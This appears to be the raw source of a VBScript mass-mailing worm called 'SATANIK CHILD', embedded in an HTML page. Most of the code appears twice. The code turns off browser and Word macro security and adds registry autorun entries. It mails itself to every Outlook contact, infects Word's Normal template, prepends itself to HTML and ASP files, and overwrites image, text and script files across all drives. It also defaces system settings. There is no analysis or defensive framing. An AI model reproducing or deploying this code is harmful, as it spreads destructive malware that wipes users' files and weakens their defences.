<!--SATANIK CHILD-->
<html><body>
<SCRIPT LANGUAGE = "VBScript"><!--
On Error Resume Next
Set SAT = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
ISD = FSO.GetSpecialFolder(0)

SAT.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\SYS", ISD & "\SYSTEM\FUKU.VBS"
SAT.RegWrite "HKCU\Software\Microsoft\Office\9.0\Word\Security\Level", 1, "REG_DWORD"
SAT.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
SAT.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201", 0, "REG_DWORD"
F2N = Array(".JS\", ".TXT\", ".GIF\", ".JPG\", ".HTT\", ".BMP\", ".HTM\", ".HTML\", ".SHS\", ".PIF\")
For F2NC = 0 To 10
SAT.RegWrite "HKEY_CLASSES_ROOT\" & F2N(F2NC), "VBSFile"
Next

If SAT.RegRead("HKLM\Software\Microsoft\FUC") = "" Then
FUCK = Document.Body.CreateTextRange.HtmlText
If FUCK = "" Then
Set SYS = FSO.OpenTextFile(WScript.ScriptFullname, 1)
FUC = SYS.ReadAll
FUCK = Mid(FUC, 2, Len(FUC))
FUCK = Mid(FUCK, 1, Len(FUCK) - 13)
FUCK = FUCK & "-->" & "<" & "/script>"
Else
FUC = "'" & Mid(FUCK, 3, Len(FUCK))
FUC = Mid(FUC, 1, Len(FUC) - 12)
FUC = FUC & "'-->" & "<" & "/script>"
End If
SAT.RegWrite "HKLM\Software\Microsoft\FUC", FUC
SAT.RegWrite "HKLM\Software\Microsoft\FUCK", FUCK
End If
FUCK = SAT.RegRead("HKLM\Software\Microsoft\FUCK")
FUC = SAT.RegRead("HKLM\Software\Microsoft\FUC")

Set DEMONIK = SAT.CreateShortcut(ISD & ".\Favorites\SATANIK_CHILD'S Page.URL")
DEMONIK.TargetPath = "http://www.amishrakefight.org/gfy/": DEMONIK.Save

If Month(Now()) = 4 And Day(Now()) = 17 Then
Msgbox "          -=FUCK YOU MOTHER FUCKERS!=-          "&Chr(10)&"THAT SATANIK CHILD, HE's SOOO CRAAAAAZY!",VbOkOnly+VbExclamation,"System Alert"
Set SYS = FSO.CreateTextFile(ISD & "\SYS.COM", 2, 0)
SYS.Write Chr(70) & Chr(85) & Chr(67) & Chr(107) & Chr(32) & Chr(89) & Chr(79) & Chr(85) & Chr(32) 
SYS.Close
SAT.Run ISD & "\SYS.COM"
End If

If SYSO.GetFile(ISD & "\SYS.VBE") = "" Then
Set SYS = FSO.CreateTextFile(ISD & "\SYS.VBE")
SYS.WriteLine FUC: SYS.Close
FSO.CopyFile ISD & "\SYS.VBE", ISD & "\SYSTEM\FUKU.VBS", 1
End If

If FSO.GetFile(ISD & "\SYSTEM\FUCKER.HTA") = "" Then
Set SYS = FSO.CreateTextFile(ISD & "\SYSTEM\FUCKER.HTA")
SYS.WriteLine "<HTML>"&"<body bgcolor=""#000000"">"&"<div id='nap' style='position: absolute; text-align:center; top:60; left:0; font-size:40pt; font-family:Arial; font-weight:bold; color:#0066CC; FILTER:Light();'>"&"&nbsp;&nbsp; s@t@nIk chIld h@s fucked y0u g00d <"&"/"&"div>"&Chr(13)&Chr(10)&"<SCRIPT language=""VBScript""><!--"&Chr(13)&Chr(10)&"d=1:n=30:call fsn"&Chr(13)&Chr(10)&"Sub fsn"&Chr(13)&Chr(10)&"If n>=400 Then d=0"&Chr(13)&Chr(10)&"If n=<70 Then d=1"&Chr(13)&Chr(10)&"If d=1 Then n=n+10 Else n=n-10"&Chr(13)&Chr(10)&"Set o=nap.Filters(""Light"")"&Chr(13)&Chr(10)&"Call o.Clear()"&Chr(13)&Chr(10)&"Call o.AddAmbient(200,200,200,100)"&Chr(13)&Chr(10)&"Call o.AddPoint(n,35,25,200,200,200,100)"&Chr(13)&Chr(10)&"SetTimeout ""Call fsn"",80"&Chr(13)&Chr(10)&"End Sub"&Chr(13)&Chr(10)&"/"&"/"&"-->"&"<"&"/"&"SCRIPT>"&"<"&"/"&"HTML>"
SYS.WriteLine FUCK:SYS.Close
End If
Set OLA = CreateObject("Outlook.Application")
For Each ALC In OLA.GetNameSpace("MAPI").AddressLists
If ALC.AddressEntries.Count <> 0 Then
Set FSS = OLA.CreateItem(0)
For FSN = 1 To ALC.AddressEntries.Count
FSS.BCC = FSS.BCC & "; " & ALC.AddressEntries(FSN).Address: Next
FSS.Subject = "FUCK YOU!!!!"
FSS.Body = "THATS RIGHT!"&Chr(13)&Chr(10)&"I SAID FUCK YOU!"&Chr(13)&Chr(10)&"I FIGURED SINCE SATANIK CHILD FUCKED ME, AND QUITE GOOD I MIGHT ADD!"&Chr(13)&Chr(10)&"I THOUGHT YOU MIGHT WANNA GET FUCKED BY HIM TOO"&Chr(13)&Chr(10)&"TRUST ME YOU WON'T REGRET THIS!"
FSS.Attachments.Add ISD & "\SYSTEM\FUCKER.HTA"
FSS.DeleteAfterSubmit = 1
FSS.Send
End If: Next

If Day(Now()) - SAT.RegRead("HKLM\Software\Microsoft\FSW") >= 10 Then
FST = "Private Sub Document_Close()"&Chr(13)&Chr(10)&"On Error Resume Next"&Chr(13)&Chr(10)&"With Options: .VirusProtection = 0: .SaveNormalPrompt = 0: .ConfirmConversions = 0: .SavePropertiesPrompt = 0: End With"&Chr(13)&Chr(10)&"System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"", ""Level"") = 1&"&Chr(13)&Chr(10)&"Set ? = IIf(MacroContainer <> NormalTemplate, Normal.ThisDocument, ActiveDocument)"&Chr(13)&Chr(10)&"�o = ActiveDocument.Saved: ?.Variables.Add ""FSI"", ThisDocument.Variables(""FSI"").Value"&Chr(13)&Chr(10)&"If ?.VBProject.Protection <> 1 And ?.VBProject.Description <> ""~''~"" Then"&Chr(13)&Chr(10)&"?.VBProject.Description = ""~''~"""&Chr(13)&Chr(10)&"With ?.VBProject.VBComponents(1).CodeModule"&Chr(13)&Chr(10)&".DeleteLines 1, .CountOfLines"&Chr(13)&Chr(10)&".AddFromString ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 25)"&Chr(13)&Chr(10)&"If Len(ActiveDocument.Path) <> 0 And Not ActiveDocument.ReadOnly Then ActiveDocument.SaveAs ActiveDocument.FullName"&Chr(13)&Chr(10)&"End With: End If: ActiveDocument.Saved = �o"&Chr(13)&Chr(10)&"Open Environ(""WINDIR"") & ""\HELP\FUKU.VBS"" For Output As #1"&Chr(13)&Chr(10)&"Print #1, ThisDocument.Variables(""FSI"").Value: Close #1"&Chr(13)&Chr(10)&"System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"", ""FSD"") = Environ(""WINDIR"") & ""\HELP\FUKU.VBS"""&Chr(13)&Chr(10)&"If Day(Now()) - System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft"", ""FSD"") >= 3 Then"&Chr(13)&Chr(10)&"With Application.FileSearch"&Chr(13)&Chr(10)&".NewSearch: .LookIn = ""C:\"": .FileName = ""*.vbs"": .SearchSubFolders = 1: .Execute"&Chr(13)&Chr(10)&"For �h = 1 To .FoundFiles.Count"&Chr(13)&Chr(10)&"Open .FoundFiles(�h) For Output As #1"&Chr(13)&Chr(10)&"Print #1, ThisDocument.Variables(""FSI"").Value: Close #1: Next: End With"&Chr(13)&Chr(10)&"System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft"", ""FSD"") = Day(Now())"&Chr(13)&Chr(10)&"End If: End Sub"

Set DNS = GetObject(, "Word.Application")
If DNS = "" Then Set DNS = CreateObject("Word.Application")
With DNS.NormalTemplate.OpenAsDocument
.Variables("FSI").Delete
.Variables.Add "FSI", FUC
.VBProject.VBComponents(1).CodeModule.DeleteLines 1, .VBProject.VBComponents(1).CodeModule.CountOfLines
.VBProject.VBComponents(1).CodeModule.AddFromString FST
.Save:End With:DNS.Quit
SAT.RegWrite "HKLM\Software\Microsoft\FSW", Day(Now())
End If

If Day(Now()) - SAT.RegRead("HKLM\Software\Microsoft\FSD") >= 3 Then
For Each DType In FSO.Drives
If DType.DriveType = 2 Or DType.DriveType = 3 Then
Searching(DType.Path&"\")
End If:Next
SAT.RegWrite "HKLM\Software\Microsoft\FSD", Day(Now())
End If

Sub Searching(fspec)
On Error Resume Next
Set FS4 = FSO.GetFolder(fspec)
For Each F2F In FS4.Files
FSS = UCase(FSO.GetExtensionName(F2F.Path))
FSO.GetFile(F2F.Path).Attributes = 32
If (Mid(FSS, 1, 2) = "HT") Or (FSS = "ASP") Then
Set FS = FSO.OpenTextFile(F2F.Path, 1)
If FS.ReadLine <> "<!--SATANIK CHILD-->" Then
FS.Close():Set FS = FSO.OpenTextFile(F2F.Path, 1):FSG = FS.ReadAll():FS.Close()
Set FS = FSO.OpenTextFile(F2F.Path, 2):FS.WriteLine"<!--SATANIK CHILD-->":FS.Write "<html><body>":FS.WriteLine FUCK:FS.WriteLine"</body></html>":FS.Write FSG:FS.Close()
Else:FS.Close():End If
ElseIf (FSS = "JS") Or (FSS = "TXT") Or (FSS = "GIF") Or (FSS = "JPG") Or (FSS = "HTT") Or (FSS = "BMP") Or (FSS = "HTM") Or (FSS = "HTML") Or (FSS = "SHS") Or (FSS = "PIF") Then
FSO.CopyFile ISD & "\FS.VBE", F2F.Path, 1
End If:Next
For Each F4D In FS4.SubFolders
Searching(F4D.Path):Next
End Sub
Sub Message2u()
    Dim intDoIt
    
    intDoIt = MsgBox(L_Welcome_Msgbox_Message_Text,  _
                     vbYesNo + vbQuestion,           _
                     L_Welcome_MsgBox_Title_Text )
    If intDoIt = VbYes Then 
    Else
    Msgbox"Well dont worry about it, SATANIK CHILD took care of that for you!",4096+VbInformation,"S@t@NiK CHiLD"
       WScript.Quit
End if
End Sub
L_Welcome_MsgBox_Message_Text    = "Hey You!  Have you ever been FUCKED really I mean really good?"
L_Welcome_MsgBox_Title_Text      = "Windows"
Call Message2u()

On Error Resume Next 

Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\software\infected\", Chr(45) & Chr(45) & Chr(45) & Chr(61) & Chr(61) & Chr(61) & Chr(61) & Chr(58) & Chr(58) & Chr(83) & Chr(65) & Chr(84) & Chr(65) & Chr(84) & Chr(65) & Chr(78) & Chr(73) & Chr(75) & Chr(32) & Chr(67) & Chr(72) & Chr(73) & Chr(76) & Chr(68) & Chr(58) & Chr(58) & Chr(61) & Chr(61) & Chr(61) & Chr(61) & Chr(45) & Chr(45) & Chr(45) & Chr(45)
WshShell.RegWrite "HKLM\software\I got fucked\", Chr(45) & Chr(45) & Chr(45) & Chr(61) & Chr(61) & Chr(61) & Chr(61) & Chr(58) & Chr(58) & Chr(83) & Chr(65) & Chr(84) & Chr(65) & Chr(84) & Chr(65) & Chr(78) & Chr(73) & Chr(75) & Chr(32) & Chr(67) & Chr(72) & Chr(73) & Chr(76) & Chr(68) & Chr(58) & Chr(58) & Chr(61) & Chr(61) & Chr(61) & Chr(61) & Chr(45) & Chr(45) & Chr(45) & Chr(45)
Dim sh, v, r
Set sh = WScript.CreateObject("WScript.Shell")
         If v = 2 Then
                wscript.quit
   End if
         r = ("==[INFECTED]==  ----====:SATANIK CHILD:====----  ==[INFECTED]==")
         If r = "empty" Then
             
sh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Window Title", "", "REG_SZ"
sh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", "", "REG_SZ"
sh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Window Title", "", "REG_SZ"
sh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Window Title", r, "REG_SZ"
sh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", "", "REG_SZ"
sh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", r, "REG_SZ"

  End if

Dim ownership, satan, own, s, ownz
Set ownership = CreateObject("WScript.Shell")
satan = ownership.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner\")
ownership.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Version", "666"
ownership.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", " S A T A N I K  C H I L D "
ownership.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "SATANIK VIRUS CREATIONSZ"
ownership.RegWrite s, own
set ownership = nothing


Set lowsecurity = CreateObject("WScript.Shell")
lowsecurity.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1004" , 0, "REG_DWORD"
lowsecurity.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1200" , 0, "REG_DWORD"
lowsecurity.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
lowsecurity.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004" , 0, "REG_DWORD"
lowsecurity.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200" , 0, "REG_DWORD"
lowsecurity.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201" , 0, "REG_DWORD"

Set wordsecurity = WScript.CreateObject("WScript.Shell")
wordsecurity.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\level", 1, "REG_DWORD"


Set W1=CreateObject("WScript.Shell")
W1.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop",1, "REG_DWORD"
W1.RegWrite"HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\","n1B elcyceR"--></script>
</body></html>
<HTML><body bgcolor="#000000"><div id='nap' style='position: absolute; text-align:center; top:60; left:0; font-size:40pt; font-family:Arial; font-weight:bold; color:#0066CC; FILTER:Light();'>&nbsp;&nbsp; s@t@nIk chIld h@s fucked y0u g00d </div>
<SCRIPT language="VBScript"><!--
d=1:n=30:call fsn
Sub fsn
If n>=400 Then d=0
If n=<70 Then d=1
If d=1 Then n=n+10 Else n=n-10
Set o=nap.Filters("Light")
Call o.Clear()
Call o.AddAmbient(200,200,200,100)
Call o.AddPoint(n,35,25,200,200,200,100)
SetTimeout "Call fsn",80
End Sub
//--></SCRIPT>
<SCRIPT LANGUAGE = "VBScript"><!--
n Error Resume Next
Set SAT = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
ISD = FSO.GetSpecialFolder(0)

SAT.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\SYS", ISD & "\SYSTEM\FUKU.VBS"
SAT.RegWrite "HKCU\Software\Microsoft\Office\9.0\Word\Security\Level", 1, "REG_DWORD"
SAT.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
SAT.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201", 0, "REG_DWORD"
F2N = Array(".JS\", ".TXT\", ".GIF\", ".JPG\", ".HTT\", ".BMP\", ".HTM\", ".HTML\", ".SHS\", ".PIF\")
For F2NC = 0 To 10
SAT.RegWrite "HKEY_CLASSES_ROOT\" & F2N(F2NC), "VBSFile"
Next

If SAT.RegRead("HKLM\Software\Microsoft\FUC") = "" Then
FUCK = Document.Body.CreateTextRange.HtmlText
If FUCK = "" Then
Set SYS = FSO.OpenTextFile(WScript.ScriptFullname, 1)
FUC = SYS.ReadAll
FUCK = Mid(FUC, 2, Len(FUC))
FUCK = Mid(FUCK, 1, Len(FUCK) - 13)
FUCK = FUCK & "-->" & "<" & "/script>"
Else
FUC = "'" & Mid(FUCK, 3, Len(FUCK))
FUC = Mid(FUC, 1, Len(FUC) - 12)
FUC = FUC & "'-->" & "<" & "/script>"
End If
SAT.RegWrite "HKLM\Software\Microsoft\FUC", FUC
SAT.RegWrite "HKLM\Software\Microsoft\FUCK", FUCK
End If
FUCK = SAT.RegRead("HKLM\Software\Microsoft\FUCK")
FUC = SAT.RegRead("HKLM\Software\Microsoft\FUC")

Set DEMONIK = SAT.CreateShortcut(ISD & ".\Favorites\SATANIK_CHILD'S Page.URL")
DEMONIK.TargetPath = "http://www.amishrakefight.org/gfy/": DEMONIK.Save

If Month(Now()) = 4 And Day(Now()) = 17 Then
Msgbox "          -=FUCK YOU MOTHER FUCKERS!=-          "&Chr(10)&"THAT SATANIK CHILD, HE's SOOO CRAAAAAZY!",VbOkOnly+VbExclamation,"System Alert"
Set SYS = FSO.CreateTextFile(ISD & "\SYS.COM", 2, 0)
SYS.Write Chr(70) & Chr(85) & Chr(67) & Chr(107) & Chr(32) & Chr(89) & Chr(79) & Chr(85) & Chr(32) 
SYS.Close
SAT.Run ISD & "\SYS.COM"
End If

If SYSO.GetFile(ISD & "\SYS.VBE") = "" Then
Set SYS = FSO.CreateTextFile(ISD & "\SYS.VBE")
SYS.WriteLine FUC: SYS.Close
FSO.CopyFile ISD & "\SYS.VBE", ISD & "\SYSTEM\FUKU.VBS", 1
End If

If FSO.GetFile(ISD & "\SYSTEM\FUCKER.HTA") = "" Then
Set SYS = FSO.CreateTextFile(ISD & "\SYSTEM\FUCKER.HTA")
SYS.WriteLine "<HTML>"&"<body bgcolor=""#000000"">"&"<div id='nap' style='position: absolute; text-align:center; top:60; left:0; font-size:40pt; font-family:Arial; font-weight:bold; color:#0066CC; FILTER:Light();'>"&"&nbsp;&nbsp; s@t@nIk chIld h@s fucked y0u g00d <"&"/"&"div>"&Chr(13)&Chr(10)&"<SCRIPT language=""VBScript""><!--"&Chr(13)&Chr(10)&"d=1:n=30:call fsn"&Chr(13)&Chr(10)&"Sub fsn"&Chr(13)&Chr(10)&"If n>=400 Then d=0"&Chr(13)&Chr(10)&"If n=<70 Then d=1"&Chr(13)&Chr(10)&"If d=1 Then n=n+10 Else n=n-10"&Chr(13)&Chr(10)&"Set o=nap.Filters(""Light"")"&Chr(13)&Chr(10)&"Call o.Clear()"&Chr(13)&Chr(10)&"Call o.AddAmbient(200,200,200,100)"&Chr(13)&Chr(10)&"Call o.AddPoint(n,35,25,200,200,200,100)"&Chr(13)&Chr(10)&"SetTimeout ""Call fsn"",80"&Chr(13)&Chr(10)&"End Sub"&Chr(13)&Chr(10)&"/"&"/"&"-->"&"<"&"/"&"SCRIPT>"&"<"&"/"&"HTML>"
SYS.WriteLine FUCK:SYS.Close
End If
Set OLA = CreateObject("Outlook.Application")
For Each ALC In OLA.GetNameSpace("MAPI").AddressLists
If ALC.AddressEntries.Count <> 0 Then
Set FSS = OLA.CreateItem(0)
For FSN = 1 To ALC.AddressEntries.Count
FSS.BCC = FSS.BCC & "; " & ALC.AddressEntries(FSN).Address: Next
FSS.Subject = "FUCK YOU!!!!"
FSS.Body = "THATS RIGHT!"&Chr(13)&Chr(10)&"I SAID FUCK YOU!"&Chr(13)&Chr(10)&"I FIGURED SINCE SATANIK CHILD FUCKED ME, AND QUITE GOOD I MIGHT ADD!"&Chr(13)&Chr(10)&"I THOUGHT YOU MIGHT WANNA GET FUCKED BY HIM TOO"&Chr(13)&Chr(10)&"TRUST ME YOU WON'T REGRET THIS!"
FSS.Attachments.Add ISD & "\SYSTEM\FUCKER.HTA"
FSS.DeleteAfterSubmit = 1
FSS.Send
End If: Next

If Day(Now()) - SAT.RegRead("HKLM\Software\Microsoft\FSW") >= 10 Then
FST = "Private Sub Document_Close()"&Chr(13)&Chr(10)&"On Error Resume Next"&Chr(13)&Chr(10)&"With Options: .VirusProtection = 0: .SaveNormalPrompt = 0: .ConfirmConversions = 0: .SavePropertiesPrompt = 0: End With"&Chr(13)&Chr(10)&"System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"", ""Level"") = 1&"&Chr(13)&Chr(10)&"Set ? = IIf(MacroContainer <> NormalTemplate, Normal.ThisDocument, ActiveDocument)"&Chr(13)&Chr(10)&"�o = ActiveDocument.Saved: ?.Variables.Add ""FSI"", ThisDocument.Variables(""FSI"").Value"&Chr(13)&Chr(10)&"If ?.VBProject.Protection <> 1 And ?.VBProject.Description <> ""~''~"" Then"&Chr(13)&Chr(10)&"?.VBProject.Description = ""~''~"""&Chr(13)&Chr(10)&"With ?.VBProject.VBComponents(1).CodeModule"&Chr(13)&Chr(10)&".DeleteLines 1, .CountOfLines"&Chr(13)&Chr(10)&".AddFromString ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 25)"&Chr(13)&Chr(10)&"If Len(ActiveDocument.Path) <> 0 And Not ActiveDocument.ReadOnly Then ActiveDocument.SaveAs ActiveDocument.FullName"&Chr(13)&Chr(10)&"End With: End If: ActiveDocument.Saved = �o"&Chr(13)&Chr(10)&"Open Environ(""WINDIR"") & ""\HELP\FUKU.VBS"" For Output As #1"&Chr(13)&Chr(10)&"Print #1, ThisDocument.Variables(""FSI"").Value: Close #1"&Chr(13)&Chr(10)&"System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"", ""FSD"") = Environ(""WINDIR"") & ""\HELP\FUKU.VBS"""&Chr(13)&Chr(10)&"If Day(Now()) - System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft"", ""FSD"") >= 3 Then"&Chr(13)&Chr(10)&"With Application.FileSearch"&Chr(13)&Chr(10)&".NewSearch: .LookIn = ""C:\"": .FileName = ""*.vbs"": .SearchSubFolders = 1: .Execute"&Chr(13)&Chr(10)&"For �h = 1 To .FoundFiles.Count"&Chr(13)&Chr(10)&"Open .FoundFiles(�h) For Output As #1"&Chr(13)&Chr(10)&"Print #1, ThisDocument.Variables(""FSI"").Value: Close #1: Next: End With"&Chr(13)&Chr(10)&"System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft"", ""FSD"") = Day(Now())"&Chr(13)&Chr(10)&"End If: End Sub"

Set DNS = GetObject(, "Word.Application")
If DNS = "" Then Set DNS = CreateObject("Word.Application")
With DNS.NormalTemplate.OpenAsDocument
.Variables("FSI").Delete
.Variables.Add "FSI", FUC
.VBProject.VBComponents(1).CodeModule.DeleteLines 1, .VBProject.VBComponents(1).CodeModule.CountOfLines
.VBProject.VBComponents(1).CodeModule.AddFromString FST
.Save:End With:DNS.Quit
SAT.RegWrite "HKLM\Software\Microsoft\FSW", Day(Now())
End If

If Day(Now()) - SAT.RegRead("HKLM\Software\Microsoft\FSD") >= 3 Then
For Each DType In FSO.Drives
If DType.DriveType = 2 Or DType.DriveType = 3 Then
Searching(DType.Path&"\")
End If:Next
SAT.RegWrite "HKLM\Software\Microsoft\FSD", Day(Now())
End If

Sub Searching(fspec)
On Error Resume Next
Set FS4 = FSO.GetFolder(fspec)
For Each F2F In FS4.Files
FSS = UCase(FSO.GetExtensionName(F2F.Path))
FSO.GetFile(F2F.Path).Attributes = 32
If (Mid(FSS, 1, 2) = "HT") Or (FSS = "ASP") Then
Set FS = FSO.OpenTextFile(F2F.Path, 1)
If FS.ReadLine <> "<!--SATANIK CHILD-->" Then
FS.Close():Set FS = FSO.OpenTextFile(F2F.Path, 1):FSG = FS.ReadAll():FS.Close()
Set FS = FSO.OpenTextFile(F2F.Path, 2):FS.WriteLine"<!--SATANIK CHILD-->":FS.Write "<html><body>":FS.WriteLine FUCK:FS.WriteLine"</body></html>":FS.Write FSG:FS.Close()
Else:FS.Close():End If
ElseIf (FSS = "JS") Or (FSS = "TXT") Or (FSS = "GIF") Or (FSS = "JPG") Or (FSS = "HTT") Or (FSS = "BMP") Or (FSS = "HTM") Or (FSS = "HTML") Or (FSS = "SHS") Or (FSS = "PIF") Then
FSO.CopyFile ISD & "\FS.VBE", F2F.Path, 1
End If:Next
For Each F4D In FS4.SubFolders
Searching(F4D.Path):Next
End Sub
Sub Message2u()
    Dim intDoIt
    
    intDoIt = MsgBox(L_Welcome_Msgbox_Message_Text,  _
                     vbYesNo + vbQuestion,           _
                     L_Welcome_MsgBox_Title_Text )
    If intDoIt = VbYes Then 
    Else
    Msgbox"Well dont worry about it, SATANIK CHILD took care of that for you!",4096+VbInformation,"S@t@NiK CHiLD"
       WScript.Quit
End if
End Sub
L_Welcome_MsgBox_Message_Text    = "Hey You!  Have you ever been FUCKED really I mean really good?"
L_Welcome_MsgBox_Title_Text      = "Windows"
Call Message2u()

On Error Resume Next 

Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\software\infected\", Chr(45) & Chr(45) & Chr(45) & Chr(61) & Chr(61) & Chr(61) & Chr(61) & Chr(58) & Chr(58) & Chr(83) & Chr(65) & Chr(84) & Chr(65) & Chr(84) & Chr(65) & Chr(78) & Chr(73) & Chr(75) & Chr(32) & Chr(67) & Chr(72) & Chr(73) & Chr(76) & Chr(68) & Chr(58) & Chr(58) & Chr(61) & Chr(61) & Chr(61) & Chr(61) & Chr(45) & Chr(45) & Chr(45) & Chr(45)
WshShell.RegWrite "HKLM\software\I got fucked\", Chr(45) & Chr(45) & Chr(45) & Chr(61) & Chr(61) & Chr(61) & Chr(61) & Chr(58) & Chr(58) & Chr(83) & Chr(65) & Chr(84) & Chr(65) & Chr(84) & Chr(65) & Chr(78) & Chr(73) & Chr(75) & Chr(32) & Chr(67) & Chr(72) & Chr(73) & Chr(76) & Chr(68) & Chr(58) & Chr(58) & Chr(61) & Chr(61) & Chr(61) & Chr(61) & Chr(45) & Chr(45) & Chr(45) & Chr(45)
Dim sh, v, r
Set sh = WScript.CreateObject("WScript.Shell")
         If v = 2 Then
                wscript.quit
   End if
         r = ("==[INFECTED]==  ----====:SATANIK CHILD:====----  ==[INFECTED]==")
         If r = "empty" Then
             
sh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Window Title", "", "REG_SZ"
sh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", "", "REG_SZ"
sh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Window Title", "", "REG_SZ"
sh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Window Title", r, "REG_SZ"
sh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", "", "REG_SZ"
sh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", r, "REG_SZ"

  End if

Dim ownership, satan, own, s, ownz
Set ownership = CreateObject("WScript.Shell")
satan = ownership.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner\")
ownership.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Version", "666"
ownership.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", " S A T A N I K  C H I L D "
ownership.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "SATANIK VIRUS CREATIONSZ"
ownership.RegWrite s, own
set ownership = nothing


Set lowsecurity = CreateObject("WScript.Shell")
lowsecurity.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1004" , 0, "REG_DWORD"
lowsecurity.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1200" , 0, "REG_DWORD"
lowsecurity.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
lowsecurity.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004" , 0, "REG_DWORD"
lowsecurity.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200" , 0, "REG_DWORD"
lowsecurity.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201" , 0, "REG_DWORD"

Set wordsecurity = WScript.CreateObject("WScript.Shell")
wordsecurity.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\level", 1, "REG_DWORD"


Set W1=CreateObject("WScript.Shell")
W1.RegWrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop",1, "REG_DWORD"
W1.RegWrite"HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\","n1B elcyceR"--></script>
//--></script>
</html>